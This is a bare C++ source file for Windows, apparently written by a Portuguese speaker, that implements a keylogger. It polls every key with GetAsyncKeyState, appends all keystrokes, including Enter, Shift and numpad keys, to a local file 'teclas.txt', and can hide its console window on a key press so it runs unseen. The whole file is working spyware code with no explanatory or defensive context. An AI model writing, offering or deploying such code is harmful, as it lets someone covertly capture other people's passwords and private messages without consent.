# include <windows.h>
# include <iostream>
# include <fstream>

using namespace std;

int main()
{
    int r,t,num;
    int caps=0;
    string x,fun;
    int x1=0;
    int x2=0;
    std::ofstream ofs;
    ofs.open ("teclas.txt", std::ofstream::out | std::ofstream::app);

    for(t=0; t<=255; t++)
    {
        r = GetAsyncKeyState(t);
        if(r==-32767)
        {
            if((caps==0)&&(t==20))caps=1;
             else if((caps==1)&&(t==20))caps=0;
            if((caps==0)&&((t>=65)&&(t<=90)))t=t+32;
            x1=GetKeyState(t);


            if((t>=97)and(t<=105))
            {
                x1=GetKeyState(t);
                if((x1==-128)or(x1==-127))
                {
                   int aux=t-96;
                   cout<<"x: Numpad "<<aux<<endl;
                   ofs<<"[Numpad: "<<aux<<"] ";
                }else
                {
                   x=t;
                   ofs << x<<" ";
                   cout<<"x: "<< x<<endl;
                }
            }else switch (t)
            {

                case 8:
                   cout<<"x: BackSpace"<<endl;
                   ofs<<"[BackSpace] ";
                break;
                case 9:
                   cout<<"x: TAB"<<endl;
                   ofs<<"[TAB] ";
                break;
                case 13:
                   cout<<"x: Enter"<<endl;
                   ofs<<"[Enter] ";
                break;
                case 20:
                   cout<<"x: CapsLock"<<endl;
                   ofs<<"[CapsLock] ";
                break;
                case 33:
                   cout<<"x: PgUp"<<endl;
                   ofs<<"[PgUp] ";
                break;
                case 34:
                   cout<<"x: PgDw"<<endl;
                   ofs<<"[PgDw] ";
                break;
                case 35:
                   cout<<"x: End"<<endl;
                   ofs<<"[End] ";
                break;
                case 36:
                   cout<<"x: Home"<<endl;
                   ofs<<"[Home] ";
                break;
                case 37:
                   cout<<"x: Seta E"<<endl;
                   ofs<<"[Seta E] ";
                break;
                case 38:
                   cout<<"x: Seta C"<<endl;
                   ofs<<"[Seta C] ";
                break;
                case 39:
                   cout<<"x: Seta D"<<endl;
                   ofs<<"[Seta D] ";
                break;
                case 40:
                   cout<<"x: Seta D"<<endl;
                   ofs<<"[Seta D] ";
                break;
                case 44:
                   cout<<"x: Print"<<endl;
                   ofs<<"[Print] ";
                break;
                case 45:
                   cout<<"x: Insert"<<endl;
                   ofs<<"[Insert] ";
                break;
                case 46:
                   cout<<"x: delete"<<endl;
                   ofs<<"[delete] ";
                break;
                case 91:
                   cout<<"x: windows"<<endl;
                   ofs<<"[windows] ";
                break;
                case 93:
                   cout<<"x: menu"<<endl;
                   ofs<<"[menu] ";
                break;
                case 144:
                   cout<<"x: NumLock"<<endl;
                   ofs<<"[NumLock] ";
                break;
                case 145:
                   cout<<"x: ScrollLock"<<endl;
                   ofs<<"[ScrollLock] ";
                break;
                case 160:
                   cout<<"x: shift E"<<endl;
                   ofs<<"[shift E] ";
                break;
                case 161:
                   cout<<"x: shift D"<<endl;
                   ofs<<"[shift D] ";
                break;
                case 162:
                   cout<<"x: ctrl E"<<endl;
                   ofs<<"[ctrl E] ";
                break;
                case 163:
                   cout<<"x: ctrl D"<<endl;
                   ofs<<"[ctrl D] ";
                break;
                case 164:
                   cout<<"x: alt D"<<endl;
                   ofs<<"[alt D] ";
                break;
                case 165:
                   cout<<"x: alt Gr"<<endl;
                   ofs<<"[alt Gr] ";
                break;
                case 174:
                   cout<<"x: Vol-"<<endl;
                   ofs<<"[Vol-] ";
                break;
                case 175:
                   cout<<"x: Vol+"<<endl;
                   ofs<<"[Vol+] ";
                break;
                case 187:
                   cout<<"x: ="<<endl;
                   ofs<<"[=] ";
                break;
                case 188:
                   cout<<"x: ,"<<endl;
                   ofs<<"[,] ";
                break;
                case 189:
                   cout<<"x: -"<<endl;
                   ofs<<"[-] ";
                break;
                case 190:
                   cout<<"x: ."<<endl;
                   ofs<<"[.] ";
                break;
                case 191:
                   cout<<"x: ;"<<endl;
                   ofs<<"[;] ";
                break;
                case 192:
                   cout<<"x: '"<<endl;
                   ofs<<"['] ";
                break;
                case 193:
                   cout<<"x: /"<<endl;
                   ofs<<"[/] ";
                break;
                case 219:
                   cout<<"x: ´"<<endl;
                   ofs<<"[´] ";
                break;
                case 220:
                   cout<<"x: ]"<<endl;
                   ofs<<"] ";
                break;
                case 221:
                   cout<<"x: ["<<endl;
                   ofs<<"[ ";
                break;
                case 222:
                   cout<<"x: ~"<<endl;
                   ofs<<"[~] ";
                break;



                default:
                  x=t;
                  ofs << x<<" ";
                  cout<<"x: "<< x<<endl;
                break;
            }

            if (t==27)
            {
               ofs.close();
               break;
            }
            if (t==88){ ShowWindow( GetConsoleWindow(), SW_RESTORE ); } //88 120
            if (t==89){ ShowWindow( GetConsoleWindow(), SW_HIDE ); }//89 113
        }

        if(t==255)
        {
            t=0;
        }

    }
    ofs.close();
    return 0;
}
